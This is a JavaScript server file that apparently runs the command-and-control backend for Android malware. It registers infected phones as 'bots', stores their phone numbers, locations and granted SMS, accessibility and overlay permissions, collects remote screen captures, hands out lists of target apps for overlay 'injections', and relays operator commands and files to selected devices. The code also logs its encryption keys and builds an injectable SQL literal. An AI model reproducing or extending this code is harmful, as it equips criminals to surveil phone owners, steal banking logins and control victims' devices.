require('dotenv').config();
require('module-alias/register');
const uWS = require('uWebSockets.js');
const setupApiRoutes = require('./app/Routes/Api');
const path = require('path');
const logger = require('./app/Helpers/logger');
const { setCorsHeaders } = require('./app/Http/Middleware/Middleware');
const BuildEvents = require('./app/Helpers/BuildEvents');
const { Bot, BotVNC, BotLog, BotCommand } = require('./database');
const { sequelize } = require('./database');
const { bots, clients, encrypt, decrypt } = require('./bots');

// Debug environment variables
logger.debug(process.env.VITE_BACKEND_KEY);
logger.debug(process.env.VITE_INITIAL_VECTOR_KEY);

// Environment variables
const BACKEND_INTERFACE = process.env.BACKEND_INTERFACE || '0.0.0.0';
const BACKEND_PORT = parseInt(process.env.BACKEND_PORT, 10) || 8089;
const WEBSOCKET_INTERFACE = process.env.WEBSOCKET_INTERFACE || '0.0.0.0';
const WEBSOCKET_PORT = parseInt(process.env.WEBSOCKET_PORT, 10) || 3434;
const USE_HTTPS = process.env.USE_HTTPS === 'true';

// Global uncaught handlers
process.on('uncaughtException', (err) => {
  console.error('UNCAUGHT EXCEPTION:', err.stack || err);
  process.exit(1);
});
process.on('unhandledRejection', (reason, promise) => {
  console.error('UNHANDLED REJECTION at:', promise, 'reason:', reason.stack || reason);
  process.exit(1);
});

// 1) First, authenticate with the database before doing anything else.
if (typeof sequelize.authenticate !== 'function') {
  logger.error('Sequelize authenticate method is not a function or is undefined!');
  process.exit(1);
}

sequelize
  .authenticate()
  .then(() => {
    logger.info('Database connection has been established successfully (in server.js).');
    startServer(); // Only start the HTTP+WS server once DB is confirmed up
  })
  .catch((err) => {
    logger.error('Unable to connect to the database (in server.js):', {
      message: err.message,
      stack: err.stack,
      timestamp: new Date().toUTCString(),
    });
    process.exit(1);
  });

function startServer() {
  let app;

  // Initialize HTTP or HTTPS server
  if (USE_HTTPS) {
    logger.info('Using HTTPS');
    console.log('Using HTTPS console');
    app = uWS.SSLApp({
      key_file_name: path.resolve(__dirname, 'ssl/private/nginx.key'),
      cert_file_name: path.resolve(__dirname, 'ssl/certs/nginx.crt'),
    });
  } else {
    app = uWS.App();
    logger.info('Using HTTP');
    console.log('Using HTTP console');
  }

  // Health check endpoint
  app.get('/health', (res, req) => {
    res.onAborted(() => {
      res.aborted = true;
    });
    res.writeStatus('200 OK');
    res.writeHeader('Content-Type', 'text/plain');
    res.end('OK');
  });


app.options('/*', (res, req) => {
  res.cork(() => {
    setCorsHeaders(res, req);          // your helper keeps the dynamic Origin etc.
    res.writeStatus('204 No Content').end();
  });
  logger.debug('⚡ CORS pre-flight handled for', req.getUrl());
});
 /*  app.options('/*', (res, req) => {
    // you already export this helper from Middleware.js – reuse it
    setCorsHeaders(res, req);

    // tell the browser there’s nothing else to fetch
    res.writeStatus('204 No Content').end();
  }); */

  // Optionally, log HTTP requests (uncomment if desired)
  function logHttpRequest(req) {
    const url = req.getUrl();
    const method = req.getMethod();
    const headers = {};
    req.forEach((key, value) => {
      headers[key] = value;
    });
    const logEntry = {
      url,
      method,
      headers,
      timestamp: new Date().toISOString(),
    };
    console.log(`HTTP Request console: ${JSON.stringify(logEntry)}`);
    logger.info(`HTTP Request: ${JSON.stringify(logEntry)}`);
  }

  // Setting up API routes
  logger.info('Setting up API routes');
  setupApiRoutes(app, { uWSApp: app });

  // Start the HTTP/HTTPS server
  logger.info('Attempting to listen on port:', BACKEND_PORT);
  app.listen(BACKEND_INTERFACE, BACKEND_PORT, (listenSocket) => {
    if (listenSocket) {
      const protocol = USE_HTTPS ? 'HTTPS' : 'HTTP';
      logger.info(`${protocol} server running on port ${BACKEND_PORT}`);
    } else {
      const protocol = USE_HTTPS ? 'HTTPS' : 'HTTP';
      logger.error(`Failed to listen on ${protocol} port ${BACKEND_PORT}`);
      process.exit(1);
    }
  });

  // Start the WebSocket server
  startWebSocketServer();
}

function startWebSocketServer() {
  const wsApp = uWS.App();

  // 
  // Define a simple "publish" method so the BuilderController (or anywhere else)
  // can do `global.uWSServer.publish(channel, message)` to broadcast to all WS clients.
  //
 /*  global.uWSServer = {
    publish: (channel, msg) => {
      // For demonstration, we just send to all connected, registered clients.
      // If you want channels per "code", you'd parse `channel` 
      // and only send to relevant clients, etc.
      for (const ws of clients) {
        if (ws.isOpen && ws.isRegistered) {
          // Encrypt if desired
          const ciphertext = encrypt(msg); 
          ws.send(ciphertext);
        }
      }
    }
  }; */

  wsApp.ws('/ws', { // Ensure your wsUrl on frontend and Android matches this path
    compression: uWS.DEDICATED_COMPRESSOR_3KB,
    maxPayloadLength: 16 * 1024 * 1024, // Increased for potentially larger VNC images
    idleTimeout: 70, // Slightly longer idle timeout
    upgrade: (res, req, context) => {
      const ua = req.getHeader('user-agent');                 // keep a copy
      const ip = Buffer.from(res.getRemoteAddressAsText()).toString();
      logger.debug('[WS] Received WebSocket upgrade request from:', ua);

      try {
        res.upgrade(
          { url: req.getUrl(), ip },                           // pass the copy
          req.getHeader('sec-websocket-key'),
          req.getHeader('sec-websocket-protocol'),
          req.getHeader('sec-websocket-extensions'),
          context
        );
        logger.debug('[WS] WebSocket upgrade successful for IP:', ip);
      } catch (error) {
        // we’re still *before* the upgrade, so this is safe
        res.writeStatus('400 Bad Request').end();
        logger.error('[WS] WebSocket upgrade failed:', error);
      }
    },
    open: (ws) => {
      ws.isOpen = true;
      ws.isRegistered = false; // Panel or Bot
      ws.connectionType = null; // 'bot' or 'panel'
      ws.uid = null; // For bots
      clients.add(ws); // Add to generic clients set
      logger.info(`[WS] Connection opened. IP: ${ws.ip}. Total clients: ${clients.size}`);
    },
    message: (ws, message, isBinary) => {
      if (isBinary) {
        logger.warn('[WS] Received unexpected binary message. Ignoring.');
        return;
      }

      let data;
      try {
        const plainTextMessage = Buffer.from(message).toString('utf8');
        const decrypted = decrypt(plainTextMessage);
        data = JSON.parse(decrypted);
      } catch (error) {
        logger.error('[WS] Error decrypting or parsing message:', error.message, 'Closing connection for IP:', ws.ip);
        ws.end(1003, 'Invalid message format or decryption failed');
        return;
      }

      const event = data.event;
      const uid = data.uid;

      const botSpecificEvents = ['updateBotParams', 'OnRegisterResponse', 'updateSubInfo', 'updateinjections', 'vnc_payload', 'logs', 'onStartCmd'];
      if (botSpecificEvents.includes(event) && !uid) {
          logger.warn(`[WS] Event "${event}" requires UID, but none provided. IP: ${ws.ip}`);
          // Optionally send error back to client if it's a registered bot
          if (ws.isRegistered && ws.isOpen) {
            ws.send(encrypt(JSON.stringify({ event: "error", message: `UID required for event: ${event}` })));
          }
          return;
      }
      // Further check for bot-specific events if ws is actually a registered bot
      if (botSpecificEvents.includes(event) && (ws.connectionType !== 'bot' || !ws.isRegistered || ws.uid !== uid)) {
          logger.warn(`[WS] Event "${event}" from non-bot/unregistered/mismatched UID. WS-UID: ${ws.uid}, Data-UID: ${uid}, IP: ${ws.ip}`);
          if (ws.isOpen) {
            ws.send(encrypt(JSON.stringify({ event: "error", message: "Not authorized or mismatched UID for this event." })));
          }
          return;
      }

      switch (event) {
        case 'register': {
          if (!uid) {
            logger.warn('[WS] Bot "register" event missing uid. IP:', ws.ip);
            ws.end(1008, 'UID required for registration');
            return;
          }
          ws.connectionType = 'bot';
          ws.isRegistered = true;
          ws.uid = uid;
          bots.set(uid, ws);

          const metadataFromClient = {
            manufacturer: data.manufacturer, device: data.device, sdk: data.sdk,
            version: data.version, screenResolution: data.screenResolution,
            country: data.country, countryCode: data.countryCode,
            operator: data.operator, phone_number: data.phone_number,
            operator1: data.operator1, phone_number1: data.phone_number1,
            isDualSim: data.isDualSim, wifiIpAddress: data.wifiIpAddress,
          };
          const subInfoFromClient = {
            location: data.location, batteryLevel: data.batteryLevel,
            vnc_work_image: data.vnc_work_image, vnc_work_tree: data.vnc_work_tree,
            accessibility: data.accessibility, admin: data.admin, screen: data.screen,
            isKeyguardLocked: data.isKeyguardLocked, isDozeMode: data.isDozeMode,
          };
          const permissionsFromClient = {
            all_permission: data.all_permission, contacts_permission: data.contacts_permission,
            accounts_permission: data.accounts_permission,
            notification_permission: data.notification_permission,
            sms_permission: data.sms_permission, overlay_permission: data.overlay_permission,
          };

          Bot.findOrCreate({
            where: { id: uid },
            defaults: {
              id: uid, ip: ws.ip, last_connection: new Date(), tag: data.tag || 'default',
              metadata: metadataFromClient,
              sub_info: subInfoFromClient,
              permissions: permissionsFromClient,
              settings: {}, // Initialize with empty settings or load defaults
            }
          })
          .then(([bot, created]) => {
            if (!created) { // Bot existed, update its info
              bot.ip = ws.ip;
              bot.last_connection = new Date();
              bot.tag = data.tag || bot.tag; // Update tag if provided
              // Merge smartly: overwrite with new client data if present, keep old if not
              Object.keys(metadataFromClient).forEach(key => {
                if (metadataFromClient[key] !== undefined) bot.metadata[key] = metadataFromClient[key];
              });
              Object.keys(subInfoFromClient).forEach(key => {
                if (subInfoFromClient[key] !== undefined) bot.sub_info[key] = subInfoFromClient[key];
              });
               Object.keys(permissionsFromClient).forEach(key => {
                if (permissionsFromClient[key] !== undefined) bot.permissions[key] = permissionsFromClient[key];
              });
              // Mark fields as changed if using Sequelize < v6 with direct assignment to JSON field
              if (sequelize.constructor.version.split('.')[0] < 6) {
                bot.changed('metadata', true);
                bot.changed('sub_info', true);
                bot.changed('permissions', true);
              }
              return bot.save();
            }
            return bot; // Newly created bot
          })
          .then((savedBot) => {
            logger.info(`[WS] Bot "${savedBot.id}" registered/updated successfully. IP: ${ws.ip}`);
            // Fetch settings and commands for the bot
            return Bot.findByPk(savedBot.id, { attributes: ['settings', 'active_injection'] })
              .then(botCurrentSettings => {
                 // Fetch pending commands for this bot from BotCommand table
                 // Example: commands that are not processed and run_at is null or past
                return BotCommand.findAll({
                    where: {
                        bot_id: savedBot.id,
                        is_processed: false,
                        // run_at: { [Op.or]: [null, { [Op.lte]: new Date() }] } // If you use run_at
                    },
                    order: [['createdAt', 'ASC']] // Or by run_at
                }).then(pendingDbCommands => {
                    const commandsForBotClient = pendingDbCommands.map(dbCmd => ({
                        id: dbCmd.panel_command_uuid || dbCmd.id, // Use panel_command_uuid if you store it
                        commands: dbCmd.command // This is the JSON field { command: "name", payload: {} }
                    }));

                    if (ws.isOpen) {
                        ws.send(encrypt(JSON.stringify({
                          event: "registered_successfully", uid: savedBot.id,
                          settings: JSON.stringify(botCurrentSettings?.settings || {}),
                          activeInjection: botCurrentSettings?.active_injection || "",
                          commands: JSON.stringify(commandsForBotClient) // Send initial commands
                        })));
                    }
                });
              });
          })
          .catch(dbError => {
            logger.error('[WS] Bot "register" DB error for UID', uid, dbError);
            if (ws.isOpen) ws.send(encrypt(JSON.stringify({event: "error", message: "Registration failed on server."})));
          });
          break;
        }
        
        case 'updateBotParams': {
          // This event essentially sends the same comprehensive data as 'register'
          // So, the logic is very similar to the update part of 'register'
          Bot.findByPk(uid)
            .then(bot => {
              if (bot) {
                const updateData = data; // Client sends all data at the root of the JSON
                bot.ip = ws.ip; // Update IP on any significant interaction
                bot.last_connection = new Date();
                // Merge metadata
                const metadataFields = ['manufacturer', 'device', 'sdk', 'version', 'screenResolution', 'country', 'countryCode', 'operator', 'phone_number', 'operator1', 'phone_number1', 'isDualSim', 'wifiIpAddress'];
                metadataFields.forEach(key => {
                    if (updateData[key] !== undefined) bot.metadata[key] = updateData[key];
                });
                // Merge sub_info
                const subInfoFields = ['location', 'batteryLevel', 'vnc_work_image', 'vnc_work_tree', 'accessibility', 'admin', 'screen', 'isKeyguardLocked', 'isDozeMode'];
                subInfoFields.forEach(key => {
                    if (updateData[key] !== undefined) bot.sub_info[key] = updateData[key];
                });
                // Merge permissions
                const permissionFields = ['all_permission', 'contacts_permission', 'accounts_permission', 'notification_permission', 'sms_permission', 'overlay_permission'];
                permissionFields.forEach(key => {
                    if (updateData[key] !== undefined) bot.permissions[key] = updateData[key];
                });

                if (sequelize.constructor.version.split('.')[0] < 6) {
                    bot.changed('metadata', true);
                    bot.changed('sub_info', true);
                    bot.changed('permissions', true);
                }
                return bot.save();
              }
              logger.warn(`[WS] "updateBotParams" Bot not found for UID: ${uid}. IP: ${ws.ip}`);
              return null;
            })
            .then(savedBot => {
              if (savedBot) logger.info(`[WS] Bot "${uid}" params updated via updateBotParams. IP: ${ws.ip}`);
            })
            .catch(dbError => {
              logger.error('[WS] "updateBotParams" DB error for UID', uid, dbError);
            });
          break;
        }

        case 'updateSubInfo': {
          Bot.findByPk(uid)
            .then(bot => {
              if (bot) {
                const subInfoData = data; // Client sends sub_info fields at the root
                const subInfoFieldsToUpdate = ['batteryLevel', 'vnc_work_image', 'vnc_work_tree', 'accessibility', 'admin', 'screen', 'isKeyguardLocked', 'isDozeMode'];
                subInfoFieldsToUpdate.forEach(key => {
                    if (subInfoData[key] !== undefined) bot.sub_info[key] = subInfoData[key];
                });
                bot.last_connection = new Date();
                if (sequelize.constructor.version.split('.')[0] < 6) {
                    bot.changed('sub_info', true);
                }
                return bot.save();
              }
              return null;
            })
            .then(savedBot => {
              if (savedBot) logger.info(`[WS] Bot "${uid}" sub_info updated. IP: ${ws.ip}`);
            })
            .catch(dbError => {
              logger.error('[WS] "updateSubInfo" DB error for UID', uid, dbError);
            });
          break;
        }

        case 'updateinjections': { // Client requests new injection list
            Bot.findByPk(uid, { attributes: ['tag', 'settings'] }) // Assuming settings might influence which injections apply
            .then(bot => {
                if (bot) {
                    // --- THIS IS WHERE YOU IMPLEMENT YOUR LOGIC TO GET INJECTIONS ---
                    // This logic was previously in your PHP/Go backend and triggered by an HTTP call.
                    // Now, the bot requests it over WebSocket.
                    // You need to query your database (e.g., an 'Injections' table)
                    // based on the bot's tag, or globally, or based on bot.settings.
                    // For demonstration, using placeholders:
                    let allInjectionsForBot = ""; // Example: "com.app1;com.app2;com.app3"
                    let activeInjectionForBot = ""; // Example: "com.app2"

                    // Placeholder: Fetch from a hypothetical Injections table
                       Injection.findAll({ where: { target_tag: bot.tag, is_active: true } })
                       .then(injections => {
                         allInjectionsForBot = injections.map(inj => inj.packageName).join(';');
                         activeInjectionForBot = injections.find(inj => inj.is_default_active)?.packageName || "";

                        if (ws.isOpen) {
                            ws.send(encrypt(JSON.stringify({
                                event: "injections_list", // Client's Websocketyt.kt handleIncoming expects this
                                uid: uid,
                                allInjections: allInjectionsForBot, // Semicolon-separated string
                                activeInjection: activeInjectionForBot
                            })));
                        }
                        logger.info(`[WS] Sent injections list to bot "${uid}" (Apps from client: ${data.apps ? data.apps.length : 0}). IP: ${ws.ip}`);
                       })
                    //   .catch(injErr => logger.error("Error fetching injections:", injErr));
                } else {
                    logger.warn(`[WS] "updateinjections" Bot not found for UID: ${uid}. IP: ${ws.ip}`);
                }
            })
            .catch(dbError => {
                logger.error('[WS] "updateinjections" request DB error for UID', uid, dbError);
            });
            break;
        }

        case 'vnc_payload': {
          const vncDataContent = data.data || {}; // Client sends image/tree in data.data
          BotVNC.findOrCreate({
            where: { bot_id: uid },
            defaults: { bot_id: uid, tree: '{}', image_blob: '' } // Ensure defaults are valid for DB
          })
          .then(([vncInst, created]) => {
            let updated = false;
            if (vncDataContent.vnc_image !== undefined) { // Check for undefined to allow sending empty string for clearing
              vncInst.image_blob = vncDataContent.vnc_image;
              updated = true;
            }
            if (vncDataContent.vnc_tree !== undefined) {
              vncInst.tree = vncDataContent.vnc_tree; // Already a JSON string from client
              updated = true;
            }
            if (updated) return vncInst.save();
            return vncInst; // No changes, no need to save
          })
          .then((vncInst) => { // vncInst here is the saved or original instance
            logger.debug(`[WS] VNC payload processed for bot "${uid}". IP: ${ws.ip}`);
            // Notify React Panel clients
            bots.forEach(panelWs => {
              if (panelWs.isOpen && panelWs.connectionType === 'panel') {
                if (ws.isOpen) {
                    panelWs.send(encrypt(JSON.stringify({
                      event: 'vnc_data_updated',
                      bot_id: uid,
                      // Send the actual data the panel needs
                      image: vncInst.image_blob, // Send the latest from DB
                      tree: JSON.parse(vncInst.tree || '{}') // Parse tree string for panel
                    })));
                }
              }
            });
          })
          .catch(dbError => {
            logger.error('[WS] "vnc_payload" DB error for UID', uid, dbError);
          });
          break;
        }

        case 'logs': {
          const logsPayload = data.payload || data;
          const logContent = logsPayload.logs || logsPayload.log || '';
          BotLog.create({
            bot_id: uid,
            type: logsPayload.type || 'info',
            application: logsPayload.application || 'general',
            log: typeof logContent === 'string' ? logContent : JSON.stringify(logContent),
          })
          .then(() => Bot.update({ last_connection: new Date() }, { where: { id: uid } }))
          .then(() => {
            logger.debug(`[WS] Log stored for bot "${uid}". IP: ${ws.ip}`);
          })
          .catch(dbError => {
            logger.error('[WS] "logs" DB error for UID', uid, dbError);
          });
          break;
        }

        case 'onStartCmd': {
            const cmdIdFromBot = data.cmdId; // This should be the panel_command_uuid
            logger.info(`[WS] Bot "${uid}" confirmed start of command (Panel UUID: ${cmdIdFromBot}). IP: ${ws.ip}`);
            BotCommand.update(
                { status: 'executing', is_processed: false, started_at: new Date() }, // is_processed is false until completion
                { where: { panel_command_uuid: cmdIdFromBot, bot_id: uid } }
            )
            .then(([affectedRows]) => {
                if (affectedRows > 0) {
                    logger.info(`[WS] Updated BotCommand status to 'executing' for Panel UUID ${cmdIdFromBot}`);
                } else {
                    logger.warn(`[WS] No BotCommand found to update status for Panel UUID ${cmdIdFromBot}, bot ${uid}`);
                }
            })
            .catch(dbError => {
                logger.error('[WS] "onStartCmd" DB error for Panel UUID', cmdIdFromBot, dbError);
            });
            break;
        }

        // --- PANEL ORIGINATED EVENTS ---
        case 'sendCommands': {
          ws.connectionType = 'panel'; // Mark this connection as a panel if not already
          ws.isRegistered = true; // Panel is implicitly "registered" by sending valid commands
          logger.info(`[WS] Received "sendCommands" request from Panel. IP: ${ws.ip}. Target botIds: ${data.botIds}`);

          const panelCommandUUID = data.uuid; // UUID from panel for this command batch/instance

          const commandDataForBot = { // This is what gets stored in BotCommand.command (JSON field)
            command: data.command,
            payload: data.payload || {},
            ...(data.filesBase64 && data.filesBase64.length > 0 && { filesBase64: data.filesBase64 }),
          };

          // This is what gets sent to the Android bot
          const messageToRelayToBot = {
            event: "command",
            Commands: [{
              id: panelCommandUUID, // Android client uses this ID to report back (e.g. onStartCmd)
              commands: commandDataForBot
            }]
          };

          const targetBotIds = Array.isArray(data.botIds) ? data.botIds : [data.botIds].filter(id => id);

          const commandProcessingPromises = targetBotIds.map(targetBotId => {
            return BotCommand.create({
              panel_command_uuid: panelCommandUUID,
              bot_id: targetBotId,
              command: commandDataForBot, // Store the command details
              is_processed: false,
              status: 'pending_send', // Status before attempting to send to bot
              panel_ip_address: ws.ip,
              // run_at: null, // Set if you have scheduling logic
            })
            .then(dbCommand => {
              const targetBotWs = bots.get(targetBotId);
              if (targetBotWs && targetBotWs.isOpen) {
                try {
                  targetBotWs.send(encrypt(JSON.stringify(messageToRelayToBot)));
                  logger.info(`[WS] Relayed command "${data.command}" (Panel UUID: ${panelCommandUUID}, DB ID: ${dbCommand.id}) to bot "${targetBotId}".`);
                  // Update status to 'sent_to_bot' after successful send
                  dbCommand.status = 'sent_to_bot';
                  return dbCommand.save().then(() => ({ botId: targetBotId, panelUuid: panelCommandUUID, dbId: dbCommand.id, status: 'sent_to_bot' }));
                } catch (sendError) {
                  logger.error(`[WS] Error encrypting/sending command to bot "${targetBotId}":`, sendError);
                  dbCommand.status = 'send_failed'; // Mark as failed to send
                  dbCommand.error_message = sendError.message;
                  return dbCommand.save().then(() => ({ botId: targetBotId, panelUuid: panelCommandUUID, dbId: dbCommand.id, status: 'send_failed', error: sendError.message }));
                }
              } else {
                logger.warn(`[WS] Bot "${targetBotId}" not connected for command (Panel UUID: ${panelCommandUUID}). Marking as 'bot_not_connected'.`);
                dbCommand.status = 'bot_not_connected';
                return dbCommand.save().then(() => ({ botId: targetBotId, panelUuid: panelCommandUUID, dbId: dbCommand.id, status: 'bot_not_connected' }));
              }
            })
            .catch(err => {
              logger.error(`[WS] Error creating BotCommand for bot "${targetBotId}" (Panel UUID: ${panelCommandUUID}):`, err);
              return { botId: targetBotId, panelUuid: panelCommandUUID, status: 'db_create_failed', error: err.message };
            });
          });

          Promise.all(commandProcessingPromises)
            .then(results => {
              if (ws.isOpen) {
                ws.send(encrypt(JSON.stringify({
                  event: "sendCommands_ack",
                  uuid: panelCommandUUID, // Panel's original command UUID
                  message: "Command batch processed for relay.",
                  results: results
                })));
              }
            })
            .catch(overallError => {
                // This catch is for errors in Promise.all itself, though individual errors are handled above
                logger.error('[WS] Error processing command batch for sendCommands:', overallError);
                 if (ws.isOpen) {
                    ws.send(encrypt(JSON.stringify({
                        event: "sendCommands_ack",
                        uuid: panelCommandUUID,
                        message: "Error processing command batch.",
                        error: overallError.message
                    })));
                }
            });
          break;
        }
        
          case 'requestpermission_result': {
            const botId   = uid;             // already verified
            const panelId = data.cmdId;      // the UUID we gave Android
            const granted = data.granted || [];

            BotCommand.update(
              {
                is_processed : true,
                command      : Sequelize.literal(
                  `JSON_SET(command, '$.response', '${JSON.stringify({
                      result: data.result,
                      granted: granted,
                      neverAskAgain: !!data.neverAskAgain
                  })}')`
                )
              },
              { where: { panel_command_uuid: panelId, bot_id: botId } }
            ).catch(console.error);

            // forward to every connected panel
            clients.forEach(c => {
              if (c.isOpen && c.connectionType === 'panel') {
                c.send(encrypt(JSON.stringify({
                  event:  'permission_result',
                  botId:  botId,
                  cmdId:  panelId,
                  result: data.result,
                  granted,
                  neverAskAgain: !!data.neverAskAgain
                })));
              }
            });

            logger.info(`[WS] permission_result from bot ${botId} for cmd ${panelId}`);
            break;
        }

        case 'panel_register': {
            ws.connectionType = 'panel';
            ws.isRegistered = true;
            // You might want to associate this panel WebSocket with a user ID if panels are user-specific
            // ws.panelUserId = data.userId; // If panel sends a user ID
            logger.info(`[WS] React Panel connected and identified itself. IP: ${ws.ip}`);
          //  if (ws.isOpen) {
          //      ws.send(encrypt(JSON.stringify({ event: "panel_registered_ok" })));
          //  }
            break;
        }

        // --- Default / Unhandled ---
        default: {
          if (!ws.isRegistered) {
            logger.warn(`[WS] Unhandled event "${event}" from unregistered ws. IP: ${ws.ip}. Terminating.`);
            ws.end(1003, 'Not registered or unknown initial event');
            return;
          }
          logger.warn(`[WS] Unhandled event for registered WS: "${event}". UID/Type: ${ws.uid || ws.connectionType}, IP: ${ws.ip}, Full Data:`, JSON.stringify(data).substring(0, 200));
          // Optionally send an "unknown_event" error back to the sender
          if (ws.isOpen) {
             ws.send(encrypt(JSON.stringify({ event: "error", message: `Unknown event type: ${event}`, original_event: event })));
          }
          break;
        }
      }
    },
    close: (ws, code, message) => {
      ws.isOpen = false;
      const reason = Buffer.from(message).toString();
      logger.info(`[WS] Connection closed. IP: ${ws.ip}, Code: ${code}, Reason: "${reason}", Type: ${ws.connectionType}, UID: ${ws.uid}. Clients before: ${clients.size}`);
      if (ws.connectionType === 'bot' && ws.uid && bots.has(ws.uid)) {
        bots.delete(ws.uid);
        logger.info(`[WS] Removed bot UID ${ws.uid} from active map. Bots map size: ${bots.size}`);
      }
      clients.delete(ws);
      logger.info(`[WS] Client removed from set. Clients set size: ${clients.size}`);
    },
  });

  // Start the WebSocket server on the configured interface and port.
  wsApp.listen(WEBSOCKET_INTERFACE, WEBSOCKET_PORT, (listenSocket) => {
    if (listenSocket) {
      logger.info(`WebSocket server running on ${WEBSOCKET_INTERFACE}:${WEBSOCKET_PORT}`);
    } else {
      logger.error(`Failed to listen on ${WEBSOCKET_INTERFACE}:${WEBSOCKET_PORT}`);
      process.exit(1);
    }
  });
}

// Authenticate with the database first, then start the server
/* sequelize.authenticate()
  .then(() => {
    logger.info('Database connection has been established successfully.');
    startServer();
  })
  .catch((err) => {
    logger.error(`Unable to connect to the database: ${err.message}`);
    process.exit(1);
  }); */
